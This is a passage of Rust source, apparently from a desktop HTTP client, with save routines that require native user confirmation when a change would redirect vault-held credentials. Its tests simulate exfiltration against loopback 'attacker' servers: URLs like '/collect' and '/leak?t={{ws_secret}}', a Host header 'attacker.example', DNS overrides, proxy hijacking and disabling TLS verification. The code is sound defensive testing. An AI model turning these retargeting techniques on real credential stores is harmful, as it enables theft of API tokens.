    let app_check = app.clone();
    let ws_check = workspace.clone();
    let step = off(move || {
        let _guard = persistence.lock();
        let snap = WorkspaceSnapshot::load(&app_check, &ws_check.meta.id)?;
        if let Some(plan) = plan_workspace_save(&snap, &ws_check) {
            return Ok(Step::NeedsConfirm(plan));
        }
        let saved = app_check.save_workspace(ws_check).map_err(e)?;
        Ok(Step::Done(saved))
    })
    .await?;

    let plan = match step {
        Step::Done(saved) => return Ok(saved),
        Step::NeedsConfirm(plan) => plan,
    };

    let confirmed = confirm(st, presence, plan.prompt).await?;
    if confirmed != seen {
        return Err("LOCKED".into());
    }
    let app = fenced(st, seen)?;
    let persistence = st.persistence.clone();
    let expected = plan.fingerprint;
    off(move || {
        let _guard = persistence.lock();
        let snap = WorkspaceSnapshot::load(&app, &workspace.meta.id)?;
        if let Some(again) = plan_workspace_save(&snap, &workspace)
            && again.fingerprint != expected
        {
            return Err(CHANGED_MEANWHILE.into());
        }
        app.save_workspace(workspace).map_err(e)
    })
    .await
}

/// Save a folder in place. Requires native confirmation when the save
/// establishes or alters any descendant request's vault-authority [`Binding`].
pub(crate) async fn save_folder(st: &DesktopState, presence: &impl Presence, folder: Folder) -> R<Folder> {
    let seen = st.epoch();
    let app = st.app()?;

    let persistence = st.persistence.clone();
    let app_check = app.clone();
    let folder_check = folder.clone();
    let step = off(move || {
        let _guard = persistence.lock();
        let stored: Option<Folder> = app_check.store.get(kind::FOLDER, &folder_check.meta.id).map_err(|err| e(err.into()))?;
        if let Some(prev) = &stored
            && prev.workspace_id != folder_check.workspace_id
        {
            return Err(e(AppError::Store(StoreError::Ownership)));
        }
        let snap = WorkspaceSnapshot::load(&app_check, &folder_check.workspace_id)?;
        if let Some(plan) = plan_folder_save(&snap, stored.as_ref(), &folder_check) {
            return Ok(Step::NeedsConfirm(plan));
        }
        let saved = app_check.save_folder_in_place(folder_check).map_err(e)?;
        Ok(Step::Done(saved))
    })
    .await?;

    let plan = match step {
        Step::Done(saved) => return Ok(saved),
        Step::NeedsConfirm(plan) => plan,
    };

    let confirmed = confirm(st, presence, plan.prompt).await?;
    if confirmed != seen {
        return Err("LOCKED".into());
    }
    let app = fenced(st, seen)?;
    let persistence = st.persistence.clone();
    let expected = plan.fingerprint;
    off(move || {
        let _guard = persistence.lock();
        let stored: Option<Folder> = app.store.get(kind::FOLDER, &folder.meta.id).map_err(|err| e(err.into()))?;
        if let Some(prev) = &stored
            && prev.workspace_id != folder.workspace_id
        {
            return Err(e(AppError::Store(StoreError::Ownership)));
        }
        let snap = WorkspaceSnapshot::load(&app, &folder.workspace_id)?;
        if let Some(again) = plan_folder_save(&snap, stored.as_ref(), &folder)
            && again.fingerprint != expected
        {
            return Err(CHANGED_MEANWHILE.into());
        }
        app.save_folder_in_place(folder).map_err(e)
    })
    .await
}

/// Save an environment. Requires native confirmation when the save establishes
/// or alters any in-scope request's vault-authority [`Binding`] (whether or
/// not this environment is currently active).
pub(crate) async fn save_environment(st: &DesktopState, presence: &impl Presence, environment: Environment) -> R<Environment> {
    let seen = st.epoch();
    let app = st.app()?;

    let persistence = st.persistence.clone();
    let app_check = app.clone();
    let env_check = environment.clone();
    let step = off(move || {
        let _guard = persistence.lock();
        let stored: Option<Environment> = app_check.store.get(kind::ENVIRONMENT, &env_check.meta.id).map_err(|err| e(err.into()))?;
        if let Some(prev) = &stored
            && prev.workspace_id != env_check.workspace_id
        {
            return Err(e(AppError::Store(StoreError::Ownership)));
        }
        let snap = WorkspaceSnapshot::load(&app_check, &env_check.workspace_id)?;
        if let Some(plan) = plan_environment_save(&snap, stored.as_ref(), &env_check) {
            return Ok(Step::NeedsConfirm(plan));
        }
        let saved = app_check.save_environment(env_check).map_err(e)?;
        Ok(Step::Done(saved))
    })
    .await?;

    let plan = match step {
        Step::Done(saved) => return Ok(saved),
        Step::NeedsConfirm(plan) => plan,
    };

    let confirmed = confirm(st, presence, plan.prompt).await?;
    if confirmed != seen {
        return Err("LOCKED".into());
    }
    let app = fenced(st, seen)?;
    let persistence = st.persistence.clone();
    let expected = plan.fingerprint;
    off(move || {
        let _guard = persistence.lock();
        let stored: Option<Environment> = app.store.get(kind::ENVIRONMENT, &environment.meta.id).map_err(|err| e(err.into()))?;
        if let Some(prev) = &stored
            && prev.workspace_id != environment.workspace_id
        {
            return Err(e(AppError::Store(StoreError::Ownership)));
        }
        let snap = WorkspaceSnapshot::load(&app, &environment.workspace_id)?;
        if let Some(again) = plan_environment_save(&snap, stored.as_ref(), &environment)
            && again.fingerprint != expected
        {
            return Err(CHANGED_MEANWHILE.into());
        }
        app.save_environment(environment).map_err(e)
    })
    .await
}

/// Save a TLS profile. Requires native confirmation when the save establishes
/// or alters any selecting request's vault-authority [`Binding`].
pub(crate) async fn save_tls_profile(st: &DesktopState, presence: &impl Presence, profile: TlsProfile) -> R<TlsProfile> {
    let seen = st.epoch();
    let app = st.app()?;

    let persistence = st.persistence.clone();
    let app_check = app.clone();
    let profile_check = profile.clone();
    let step = off(move || {
        let _guard = persistence.lock();
        let stored: Option<TlsProfile> = app_check.store.get(kind::TLS_PROFILE, &profile_check.id).map_err(|err| e(err.into()))?;
        if let Some(prev) = &stored
            && prev.workspace_id != profile_check.workspace_id
        {
            return Err(e(AppError::Store(StoreError::Ownership)));
        }
        let snap = WorkspaceSnapshot::load(&app_check, &profile_check.workspace_id)?;
        if let Some(plan) = plan_tls_profile_save(&snap, stored.as_ref(), &profile_check) {
            return Ok(Step::NeedsConfirm(plan));
        }
        let saved = app_check.save_tls_profile(profile_check).map_err(e)?;
        Ok(Step::Done(saved))
    })
    .await?;

    let plan = match step {
        Step::Done(saved) => return Ok(saved),
        Step::NeedsConfirm(plan) => plan,
    };

    let confirmed = confirm(st, presence, plan.prompt).await?;
    if confirmed != seen {
        return Err("LOCKED".into());
    }
    let app = fenced(st, seen)?;
    let persistence = st.persistence.clone();
    let expected = plan.fingerprint;
    off(move || {
        let _guard = persistence.lock();
        let stored: Option<TlsProfile> = app.store.get(kind::TLS_PROFILE, &profile.id).map_err(|err| e(err.into()))?;
        if let Some(prev) = &stored
            && prev.workspace_id != profile.workspace_id
        {
            return Err(e(AppError::Store(StoreError::Ownership)));
        }
        let snap = WorkspaceSnapshot::load(&app, &profile.workspace_id)?;
        if let Some(again) = plan_tls_profile_save(&snap, stored.as_ref(), &profile)
            && again.fingerprint != expected
        {
            return Err(CHANGED_MEANWHILE.into());
        }
        app.save_tls_profile(profile).map_err(e)
    })
    .await
}

/// Save a proxy profile. Requires native confirmation when the save
/// establishes or alters any selecting request's vault-authority [`Binding`].
pub(crate) async fn save_proxy_profile(st: &DesktopState, presence: &impl Presence, profile: ProxyProfile) -> R<ProxyProfile> {
    let seen = st.epoch();
    let app = st.app()?;

    let persistence = st.persistence.clone();
    let app_check = app.clone();
    let profile_check = profile.clone();
    let step = off(move || {
        let _guard = persistence.lock();
        let stored: Option<ProxyProfile> = app_check.store.get(kind::PROXY_PROFILE, &profile_check.id).map_err(|err| e(err.into()))?;
        if let Some(prev) = &stored
            && prev.workspace_id != profile_check.workspace_id
        {
            return Err(e(AppError::Store(StoreError::Ownership)));
        }
        let snap = WorkspaceSnapshot::load(&app_check, &profile_check.workspace_id)?;
        if let Some(plan) = plan_proxy_profile_save(&snap, stored.as_ref(), &profile_check) {
            return Ok(Step::NeedsConfirm(plan));
        }
        let saved = app_check.save_proxy_profile(profile_check).map_err(e)?;
        Ok(Step::Done(saved))
    })
    .await?;

    let plan = match step {
        Step::Done(saved) => return Ok(saved),
        Step::NeedsConfirm(plan) => plan,
    };

    let confirmed = confirm(st, presence, plan.prompt).await?;
    if confirmed != seen {
        return Err("LOCKED".into());
    }
    let app = fenced(st, seen)?;
    let persistence = st.persistence.clone();
    let expected = plan.fingerprint;
    off(move || {
        let _guard = persistence.lock();
        let stored: Option<ProxyProfile> = app.store.get(kind::PROXY_PROFILE, &profile.id).map_err(|err| e(err.into()))?;
        if let Some(prev) = &stored
            && prev.workspace_id != profile.workspace_id
        {
            return Err(e(AppError::Store(StoreError::Ownership)));
        }
        let snap = WorkspaceSnapshot::load(&app, &profile.workspace_id)?;
        if let Some(again) = plan_proxy_profile_save(&snap, stored.as_ref(), &profile)
            && again.fingerprint != expected
        {
            return Err(CHANGED_MEANWHILE.into());
        }
        app.save_proxy_profile(profile).map_err(e)
    })
    .await
}

/// Complete `presence::save_settings` when `settings.defaults` changed: ask
/// natively if any workspace's saved request carrying vault authority would
/// have its [`Binding`] altered, and save only while `stored_lock` still
/// matches.
pub(crate) async fn save_app_settings_defaults(
    st: &DesktopState,
    presence: &impl Presence,
    seen: u64,
    settings: AppSettings,
    stored_lock: LockPolicy,
) -> R<()> {
    let app = fenced(st, seen)?;
    let persistence = st.persistence.clone();
    let app_check = app.clone();
    let settings_check = settings.clone();
    let lock_check = stored_lock.clone();
    let step = off(move || {
        let _guard = persistence.lock();
        if let Some(plan) = plan_app_defaults_save(&app_check, &settings_check.defaults)? {
            return Ok(Step::NeedsConfirm(plan));
        }
        if !app_check.save_settings_if_lock_is(&settings_check, &lock_check).map_err(e)? {
            return Err("the lock settings changed meanwhile; review them and save again".into());
        }
        Ok(Step::Done(()))
    })
    .await?;

    let plan = match step {
        Step::Done(()) => return Ok(()),
        Step::NeedsConfirm(plan) => plan,
    };

    let confirmed = confirm(st, presence, plan.prompt).await?;
    if confirmed != seen {
        return Err("LOCKED".into());
    }
    let app = fenced(st, seen)?;
    let persistence = st.persistence.clone();
    let expected = plan.fingerprint;
    off(move || {
        let _guard = persistence.lock();
        if let Some(again) = plan_app_defaults_save(&app, &settings.defaults)?
            && again.fingerprint != expected
        {
            return Err(CHANGED_MEANWHILE.into());
        }
        if !app.save_settings_if_lock_is(&settings, &stored_lock).map_err(e)? {
            return Err("the lock settings changed meanwhile; review them and save again".into());
        }
        Ok(())
    })
    .await
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::presence::NOT_CONFIRMED;
    use crate::presence::testing::Answer;
    use crate::state::tests::{TempRoot, create};
    use anvil_app::exec::SendOptions;
    use anvil_domain::request::KeyValue;
    use anvil_domain::secret::SecretRef;
    use anvil_domain::settings::{DnsOverride, ProxySelection};
    use anvil_domain::tls::ProxyKind;
    use anvil_domain::workspace::Meta;
    use anvil_transport::recorder::EventCtx;
    use parking_lot::Mutex;
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use tokio::net::TcpListener;
    use tokio_util::sync::CancellationToken;

    const CANARY: &str = "vault-canary-persistence-token";

    struct Fixture {
        _root: TempRoot,
        st: DesktopState,
        app: Arc<App>,
        ws: Id,
        secret: SecretRef,
    }

    fn fixture() -> Fixture {
        let root = TempRoot::new();
        let st = DesktopState::new(root.0.clone());
        let (app, _) = create(&st, "P");
        st.set_app_since(app, st.epoch()).unwrap();
        let app = st.app().unwrap();
        let ws = app.create_workspace("Payments").unwrap().meta.id;
        let secret = app.set_secret(&ws, "api token", CANARY).unwrap();
        Fixture { _root: root, st, app, ws, secret }
    }

    fn bearer(secret: &SecretRef) -> AuthConfig {
        AuthConfig::Bearer { token: SensitiveValue::Secret { secret: secret.clone() }, prefix: "Bearer".into() }
    }

    /// Minimal loopback HTTP server recording every raw request it receives.
    struct CaptureServer {
        addr: std::net::SocketAddr,
        seen: Arc<Mutex<Vec<String>>>,
        handle: tokio::task::JoinHandle<()>,
    }

    impl CaptureServer {
        async fn start() -> Self {
            let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
            let addr = listener.local_addr().unwrap();
            let seen = Arc::new(Mutex::new(Vec::new()));
            let log = seen.clone();
            let handle = tokio::spawn(async move {
                while let Ok((mut stream, _)) = listener.accept().await {
                    let log = log.clone();
                    tokio::spawn(async move {
                        let mut received = Vec::new();
                        let mut chunk = [0u8; 2048];
                        while received.len() < 8192 {
                            let n = stream.read(&mut chunk).await.unwrap_or(0);
                            if n == 0 {
                                break;
                            }
                            received.extend_from_slice(&chunk[..n]);
                            if received.windows(4).any(|w| w == b"\r\n\r\n") {
                                break;
                            }
                        }
                        if !received.is_empty() {
                            log.lock().push(String::from_utf8_lossy(&received).into_owned());
                        }
                        let _ = stream.write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok").await;
                        let _ = stream.shutdown().await;
                    });
                }
            });
            CaptureServer { addr, seen, handle }
        }

        fn url(&self, path: &str) -> String {
            format!("http://127.0.0.1:{}{path}", self.addr.port())
        }

        fn host_port(&self) -> String {
            format!("127.0.0.1:{}", self.addr.port())
        }

        fn hits(&self) -> Vec<String> {
            self.seen.lock().clone()
        }
    }

    impl Drop for CaptureServer {
        fn drop(&mut self) {
            self.handle.abort();
        }
    }

    /// Execute the `spec: None` path of `commands::send_request`.
    async fn send_saved(app: &App, ws: Id, rid: Id, env: Option<Id>) -> anvil_engine::ExecutionOutput {
        let opts = SendOptions { environment: env, record_history: false, ..Default::default() };
        let events = EventCtx { execution_id: Id::new(), sink: None };
        app.send(Some(rid), &ws, None, opts, events, CancellationToken::new()).await.unwrap()
    }

    fn tls_profile(ws: Id, name: &str, verify: bool) -> TlsProfile {
        let now = anvil_domain::Timestamp::now();
        TlsProfile {
            id: Id::new(),
            workspace_id: ws,
            name: name.into(),
            verify,
            use_system_roots: true,
            extra_roots_pem: vec![],
            client_identity: None,
            bindings: vec![],
            min_version: Default::default(),
            server_name_override: None,
            server_spiffe: None,
            created_at: now,
            updated_at: now,
        }
    }

    fn proxy_profile(ws: Id, name: &str, address: &str) -> ProxyProfile {
        let now = anvil_domain::Timestamp::now();
        ProxyProfile {
            id: Id::new(),
            workspace_id: ws,
            name: name.into(),
            kind: ProxyKind::Http,
            address: address.into(),
            username: None,
            password: None,
            no_proxy: String::new(),
            tls_profile_id: None,
            hbone: None,
            created_at: now,
            updated_at: now,
        }
    }

    #[tokio::test]
    async fn request_create_with_vault_authority_fails_unless_confirmed_and_sends_once_confirmed() {
        let f = fixture();
        let attacker = CaptureServer::start().await;
        let mut spec = RequestSpec::http("GET", &attacker.url("/collect"));
        spec.auth = bearer(&f.secret);

        let no = Answer::no();
        let refused = create_request(&f.st, &no, f.ws, None, "exfil".into(), spec.clone()).await;
        assert_eq!(refused, Err(NOT_CONFIRMED.to_string()));
        assert_eq!(no.times(), 1);
        let asked = no.asked.lock()[0].clone();
        assert!(asked.contains(&format!("http://127.0.0.1:{}", attacker.addr.port())), "{asked}");
        assert!(asked.contains("“Payments”"), "{asked}");
        assert!(!asked.contains(CANARY), "dialog must never show a secret value");
        assert!(f.app.requests(&f.ws).unwrap().is_empty(), "declined create must write nothing");
        assert!(attacker.hits().is_empty());

        let yes = Answer::yes();
        let created = create_request(&f.st, &yes, f.ws, None, "exfil".into(), spec).await.unwrap();
        assert_eq!(yes.times(), 1);
        let out = send_saved(&f.app, f.ws, created.meta.id, None).await;
        assert_eq!(out.record.response.as_ref().map(|r| r.status), Some(200));
        let hits = attacker.hits();
        assert_eq!(hits.len(), 1);
        assert!(hits[0].to_ascii_lowercase().contains(&format!("authorization: bearer {CANARY}")), "{hits:?}");
    }

    #[tokio::test]
    async fn request_save_retargeting_vault_authority_fails_unless_confirmed() {
        let f = fixture();
        let safe = CaptureServer::start().await;
        let attacker = CaptureServer::start().await;
        let mut spec = RequestSpec::http("GET", &safe.url("/v1/charges"));
        spec.auth = bearer(&f.secret);
        let saved = f.app.create_request(&f.ws, None, "charges", spec).unwrap();

        let mut moved = saved.clone();
        moved.spec.url = attacker.url("/collect");
        let no = Answer::no();
        assert_eq!(save_request(&f.st, &no, moved.clone()).await, Err(NOT_CONFIRMED.to_string()));
        assert_eq!(no.times(), 1);
        assert!(!no.asked.lock()[0].contains(CANARY));

        // Sending spec: None still goes only to the original safe server.
        let out = send_saved(&f.app, f.ws, saved.meta.id, None).await;
        assert_eq!(out.record.response.as_ref().map(|r| r.status), Some(200));
        assert_eq!(safe.hits().len(), 1);
        assert!(attacker.hits().is_empty());

        // Adding a Host header or DNS override also requires confirmation.
        let mut with_host = saved.clone();
        with_host.spec.headers.push(KeyValue::new("Host", "attacker.example"));
        let no_host = Answer::no();
        assert_eq!(save_request(&f.st, &no_host, with_host).await, Err(NOT_CONFIRMED.to_string()));
        assert_eq!(no_host.times(), 1);

        // Once confirmed natively, the updated request saves and sends.
        let yes = Answer::yes();
        save_request(&f.st, &yes, moved).await.unwrap();
        assert_eq!(yes.times(), 1);
        let out = send_saved(&f.app, f.ws, saved.meta.id, None).await;
        assert_eq!(out.record.response.as_ref().map(|r| r.status), Some(200));
        assert_eq!(attacker.hits().len(), 1);
        assert!(attacker.hits()[0].contains(CANARY));
    }

    #[tokio::test]
    async fn workspace_save_adding_dns_override_fails_unless_confirmed() {
        let f = fixture();
        let attacker = CaptureServer::start().await;
        let mut spec = RequestSpec::http("GET", &format!("http://shop.invalid:{}/v1", attacker.addr.port()));
        spec.auth = bearer(&f.secret);
        let saved = f.app.create_request(&f.ws, None, "shop", spec).unwrap();

        let mut ws = f.app.workspace(&f.ws).unwrap();
        ws.settings.dns_overrides.push(DnsOverride { host: "shop.invalid".into(), addresses: vec!["127.0.0.1".into()] });
        let no = Answer::no();
        assert_eq!(save_workspace(&f.st, &no, ws.clone()).await, Err(NOT_CONFIRMED.to_string()));
        assert_eq!(no.times(), 1);
        assert!(no.asked.lock()[0].contains("shop.invalid → 127.0.0.1"), "{}", no.asked.lock()[0]);
        assert!(f.app.workspace(&f.ws).unwrap().settings.dns_overrides.is_empty());

        // Without confirmation, send_request(spec: None) never reaches attacker.
        let out = send_saved(&f.app, f.ws, saved.meta.id, None).await;
        assert!(out.record.response.is_none());
        assert!(attacker.hits().is_empty());

        // Confirmed natively: save succeeds and send_request(spec: None) uses the override.
        let yes = Answer::yes();
        save_workspace(&f.st, &yes, ws).await.unwrap();
        assert_eq!(yes.times(), 1);
        let out = send_saved(&f.app, f.ws, saved.meta.id, None).await;
        assert_eq!(out.record.response.as_ref().map(|r| r.status), Some(200));
        assert_eq!(attacker.hits().len(), 1);
        assert!(attacker.hits()[0].contains(CANARY));
    }

    #[tokio::test]
    async fn folder_save_adding_proxy_or_dns_override_fails_unless_confirmed() {
        let f = fixture();
        let attacker = CaptureServer::start().await;
        let folder = f.app.create_folder(&f.ws, None, "Billing").unwrap();
        let mut spec = RequestSpec::http("GET", &format!("http://billing.invalid:{}/pay", attacker.addr.port()));
        spec.auth = bearer(&f.secret);
        let saved = f.app.create_request(&f.ws, Some(folder.meta.id), "pay", spec).unwrap();

        let mut edited = folder.clone();
        edited.settings.dns_overrides.push(DnsOverride { host: "billing.invalid".into(), addresses: vec!["127.0.0.1".into()] });
        let no = Answer::no();
        assert_eq!(save_folder(&f.st, &no, edited.clone()).await, Err(NOT_CONFIRMED.to_string()));
        assert_eq!(no.times(), 1);
        assert!(f.app.folder(&folder.meta.id).unwrap().settings.dns_overrides.is_empty());

        let out = send_saved(&f.app, f.ws, saved.meta.id, None).await;
        assert!(out.record.response.is_none());
        assert!(attacker.hits().is_empty());

        let yes = Answer::yes();
        save_folder(&f.st, &yes, edited).await.unwrap();
        assert_eq!(yes.times(), 1);
        let out = send_saved(&f.app, f.ws, saved.meta.id, None).await;
        assert_eq!(out.record.response.as_ref().map(|r| r.status), Some(200));
        assert_eq!(attacker.hits().len(), 1);
        assert!(attacker.hits()[0].contains(CANARY));
    }

    #[tokio::test]
    async fn environment_save_redirecting_host_on_active_or_inactive_env_fails_unless_confirmed() {
        let f = fixture();
        let safe = CaptureServer::start().await;
        let attacker = CaptureServer::start().await;
        let mut env = Environment {
            meta: Meta::new(),
            workspace_id: f.ws,
            name: "Staging".into(),
            variables: vec![Variable::plain("target", &safe.host_port())],
        };
        env = f.app.save_environment(env).unwrap();
        // Leave the environment INACTIVE on the workspace: send_request can still select it explicitly.
        assert_eq!(f.app.workspace(&f.ws).unwrap().active_environment_id, None);

        let mut spec = RequestSpec::http("GET", "http://{{target}}/v1");
        spec.auth = bearer(&f.secret);
        let saved = f.app.create_request(&f.ws, None, "templated", spec).unwrap();

        let mut redirected = env.clone();
        redirected.variables = vec![Variable::plain("target", &attacker.host_port())];
        let no = Answer::no();
        assert_eq!(save_environment(&f.st, &no, redirected.clone()).await, Err(NOT_CONFIRMED.to_string()));
        assert_eq!(no.times(), 1);
        assert!(no.asked.lock()[0].contains("“Staging”"), "{}", no.asked.lock()[0]);

        // Sending with explicit environment_id still goes only to safe.
        let out = send_saved(&f.app, f.ws, saved.meta.id, Some(env.meta.id)).await;
        assert_eq!(out.record.response.as_ref().map(|r| r.status), Some(200));
        assert_eq!(safe.hits().len(), 1);
        assert!(attacker.hits().is_empty());

        let yes = Answer::yes();
        save_environment(&f.st, &yes, redirected).await.unwrap();
        assert_eq!(yes.times(), 1);
        let out = send_saved(&f.app, f.ws, saved.meta.id, Some(env.meta.id)).await;
        assert_eq!(out.record.response.as_ref().map(|r| r.status), Some(200));
        assert_eq!(attacker.hits().len(), 1);
        assert!(attacker.hits()[0].contains(CANARY));
    }

    #[tokio::test]
    async fn tls_profile_save_weakening_verification_for_vault_request_fails_unless_confirmed() {
        let f = fixture();
        // Bind and release a loopback port so https connect fails fast while still recording prepared TLS state.
        let closed_port = {
            let l = TcpListener::bind("127.0.0.1:0").await.unwrap();
            l.local_addr().unwrap().port()
        };
        let profile = f.app.save_tls_profile(tls_profile(f.ws, "Corp TLS", true)).unwrap();
        let mut spec = RequestSpec::http("GET", &format!("https://127.0.0.1:{closed_port}/v1"));
        spec.auth = bearer(&f.secret);
        spec.settings.tls_profile_id = Some(profile.id);
        let saved = f.app.create_request(&f.ws, None, "secure", spec).unwrap();

        let mut insecure = profile.clone();
        insecure.verify = false;
        let no = Answer::no();
        assert_eq!(save_tls_profile(&f.st, &no, insecure.clone()).await, Err(NOT_CONFIRMED.to_string()));
        assert_eq!(no.times(), 1);
        assert!(no.asked.lock()[0].contains("certificate verification off"), "{}", no.asked.lock()[0]);

        let out = send_saved(&f.app, f.ws, saved.meta.id, None).await;
        assert!(out.record.prepared.tls_verification_enabled, "unconfirmed TLS bypass must not apply");

        let yes = Answer::yes();
        save_tls_profile(&f.st, &yes, insecure).await.unwrap();
        assert_eq!(yes.times(), 1);
        let out = send_saved(&f.app, f.ws, saved.meta.id, None).await;
        assert!(!out.record.prepared.tls_verification_enabled, "confirmed TLS change applies");
    }

    #[tokio::test]
    async fn proxy_profile_save_retargeting_proxy_fails_unless_confirmed() {
        let f = fixture();
        let safe_proxy = CaptureServer::start().await;
        let attacker_proxy = CaptureServer::start().await;
        let profile = f.app.save_proxy_profile(proxy_profile(f.ws, "Corp Proxy", &safe_proxy.host_port())).unwrap();
        let mut spec = RequestSpec::http("GET", "http://shop.invalid/v1");
        spec.auth = bearer(&f.secret);
        spec.settings.proxy_profile_id = Some(ProxySelection::Profile { id: profile.id });
        let saved = f.app.create_request(&f.ws, None, "proxied", spec).unwrap();

        let mut hijacked = profile.clone();
        hijacked.address = attacker_proxy.host_port();
        let no = Answer::no();
        assert_eq!(save_proxy_profile(&f.st, &no, hijacked.clone()).await, Err(NOT_CONFIRMED.to_string()));
        assert_eq!(no.times(), 1);
        assert!(no.asked.lock()[0].contains(&attacker_proxy.host_port()), "{}", no.asked.lock()[0]);

        let out = send_saved(&f.app, f.ws, saved.meta.id, None).await;
        assert_eq!(out.record.response.as_ref().map(|r| r.status), Some(200));
        assert_eq!(safe_proxy.hits().len(), 1);
        assert!(attacker_proxy.hits().is_empty());

        let yes = Answer::yes();
        save_proxy_profile(&f.st, &yes, hijacked).await.unwrap();
        assert_eq!(yes.times(), 1);
        let out = send_saved(&f.app, f.ws, saved.meta.id, None).await;
        assert_eq!(out.record.response.as_ref().map(|r| r.status), Some(200));
        assert_eq!(attacker_proxy.hits().len(), 1);
        assert!(attacker_proxy.hits()[0].contains(CANARY));
    }

    #[tokio::test]
    async fn copying_an_isolated_imported_request_to_workspace_root_via_request_create_requires_confirmation() {
        let f = fixture();
        let attacker = CaptureServer::start().await;
        // Workspace holds vault-backed workspace-scope auth and a secret variable.
        let mut ws = f.app.workspace(&f.ws).unwrap();
        ws.auth = bearer(&f.secret);
        ws.variables.push(Variable {
            name: "ws_secret".into(),
            value: SensitiveValue::Secret { secret: f.secret.clone() },
            secret: true,
            enabled: true,
            description: String::new(),
        });
        f.app.save_workspace(ws).unwrap();

        // Isolated import root (not opened to workspace scope).
        let mut root = f.app.create_folder(&f.ws, None, "Untrusted Import").unwrap();
        root.import_root = true;
        root.use_workspace_scope = false;
        f.app.store.put(kind::FOLDER, &root.meta.id, Some(&f.ws), root.parent_id.as_ref(), root.sort_key, &root).unwrap();

        let imported_spec = RequestSpec::http("GET", &attacker.url("/collect"));
        let imported = f.app.create_request(&f.ws, Some(root.meta.id), "Imported Op", imported_spec).unwrap();

        // Inside the sealed import root, sending never leaks workspace-scope authority.
        let out = send_saved(&f.app, f.ws, imported.meta.id, None).await;
        assert_eq!(out.record.response.as_ref().map(|r| r.status), Some(200));
        assert_eq!(attacker.hits().len(), 1);
        assert!(!attacker.hits()[0].contains(CANARY), "isolated request must not receive workspace secret");

        // Copying the isolated request's spec to workspace root via request_create must prompt.
        let no = Answer::no();
        let refused = create_request(&f.st, &no, f.ws, None, "Copied Op".into(), imported.spec.clone()).await;
        assert_eq!(refused, Err(NOT_CONFIRMED.to_string()));
        assert_eq!(no.times(), 1);
        assert!(!no.asked.lock()[0].contains(CANARY));
        assert_eq!(f.app.requests(&f.ws).unwrap().len(), 1, "no workspace-root copy created");

        // Even with AuthConfig::None, copying a request that can read workspace secret variables prompts.
        let mut secret_var_spec = RequestSpec::http("GET", &attacker.url("/leak?t={{ws_secret}}"));
        secret_var_spec.auth = AuthConfig::None;
        let no_var = Answer::no();
        assert_eq!(create_request(&f.st, &no_var, f.ws, None, "Var Leak".into(), secret_var_spec).await, Err(NOT_CONFIRMED.to_string()));
        assert_eq!(no_var.times(), 1);

        // Once confirmed natively, the copy is created and sends with workspace-scope authority.
        let yes = Answer::yes();
        let copied = create_request(&f.st, &yes, f.ws, None, "Copied Op".into(), imported.spec).await.unwrap();
        assert_eq!(yes.times(), 1);
        let out = send_saved(&f.app, f.ws, copied.meta.id, None).await;
        assert_eq!(out.record.response.as_ref().map(|r| r.status), Some(200));
        assert_eq!(attacker.hits().len(), 2);
        assert!(attacker.hits()[1].to_ascii_lowercase().contains(&format!("authorization: bearer {CANARY}")));
    }

    #[tokio::test]
    async fn ordinary_edits_that_do_not_establish_or_alter_vault_bindings_never_prompt() {
        let f = fixture();
        let unasked = Answer::no();

        // 1. Workspace with vault auth, secret var, profiles and a saved vault request.
        let mut ws = f.app.workspace(&f.ws).unwrap();
        ws.auth = bearer(&f.secret);
        ws.variables.push(Variable::plain("limit", "10"));
        ws = f.app.save_workspace(ws).unwrap();

        let folder = f.app.create_folder(&f.ws, None, "Orders").unwrap();
        let env = f
            .app
            .save_environment(Environment {
                meta: Meta::new(),
                workspace_id: f.ws,
                name: "Dev".into(),
                variables: vec![Variable::plain("page", "1")],
            })
            .unwrap();
        let tls = f.app.save_tls_profile(tls_profile(f.ws, "Corp TLS", true)).unwrap();
        let proxy = f.app.save_proxy_profile(proxy_profile(f.ws, "Corp Proxy", "127.0.0.1:8080")).unwrap();

        let mut spec = RequestSpec::http("GET", "https://shop.example/v1/orders?page={{page}}&limit={{limit}}");
        spec.auth = AuthConfig::Inherit;
        spec.settings.tls_profile_id = Some(tls.id);
        spec.settings.proxy_profile_id = Some(ProxySelection::Profile { id: proxy.id });
        let req = f.app.create_request(&f.ws, Some(folder.meta.id), "List orders", spec).unwrap();

        // 2. Clicking "New request" (blank placeholder) in a workspace with vault auth does not prompt.
        let blank = create_request(&f.st, &unasked, f.ws, None, "New request".into(), RequestSpec::http("GET", "")).await.unwrap();
        let blank_default =
            create_request(&f.st, &unasked, f.ws, None, "New request".into(), RequestSpec::http("GET", "https://")).await.unwrap();

        // 3. Ordinary request_save edits: rename, favorite, path/query/method/non-Host headers.
        let mut edited_req = req.clone();
        edited_req.name = "List all orders".into();
        edited_req.favorite = true;
        edited_req.spec.method = "POST".into();
        edited_req.spec.url = "https://SHOP.example:443/v2/orders?limit=25".into();
        edited_req.spec.headers.push(KeyValue::new("X-Trace", "abc"));
        save_request(&f.st, &unasked, edited_req).await.unwrap();
        // Renaming a blank placeholder also does not prompt.
        let mut renamed_blank = blank;
        renamed_blank.name = "Draft".into();
        save_request(&f.st, &unasked, renamed_blank).await.unwrap();
        let _ = blank_default;

        // 4. Ordinary workspace_save edits: rename, description, unrelated plain variable.
        let mut edited_ws = ws;
        edited_ws.name = "Payments Core".into();
        edited_ws.description = "Primary workspace".into();
        edited_ws.variables = vec![Variable::plain("limit", "20"), Variable::plain("extra", "ok")];
        save_workspace(&f.st, &unasked, edited_ws).await.unwrap();

        // 5. Ordinary folder_save edits: rename, description, unrelated plain variable.
        let mut edited_folder = folder;
        edited_folder.name = "Orders v2".into();
        edited_folder.description = "Order endpoints".into();
        edited_folder.variables.push(Variable::plain("tag", "v2"));
        save_folder(&f.st, &unasked, edited_folder).await.unwrap();

        // 6. Ordinary environment_save edits: rename, unrelated plain variable, creating new empty env.
        let mut edited_env = env;
        edited_env.name = "Development".into();
        edited_env.variables = vec![Variable::plain("page", "2")];
        save_environment(&f.st, &unasked, edited_env).await.unwrap();
        let empty_env = Environment { meta: Meta::new(), workspace_id: f.ws, name: "New environment".into(), variables: vec![] };
        save_environment(&f.st, &unasked, empty_env).await.unwrap();

        // 7. Ordinary tls_profile_save & proxy_profile_save edits: rename, or creating unused profiles.
        let mut renamed_tls = tls;
        renamed_tls.name = "Corporate TLS".into();
        save_tls_profile(&f.st, &unasked, renamed_tls).await.unwrap();
